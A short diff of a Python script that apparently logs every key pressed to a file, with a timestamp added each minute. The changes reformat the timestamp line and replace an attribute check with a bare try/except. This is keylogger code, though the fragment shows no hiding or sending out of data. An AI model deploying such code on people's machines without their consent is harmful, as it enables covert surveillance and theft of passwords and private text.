@@ -8,12 +8,12 @@ def timestemp_everyminute():
     while True:
       timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
       with open(filename, "a", encoding="utf-8") as file:
-        file.write(f'~\n{timestemp}:~\n\n')
+        file.write(f'\n~{timestemp}:~\n\n')
       time.sleep(60)
 def on_press(key):
-    if hasattr(key, 'char') and key.char is not None:
+    try:
         text_key = (key.char)
-    else:
+    except:
         text_key = (key)
     with open(filename, "a", encoding="utf-8") as file:
         file.write(f'{text_key}\n')
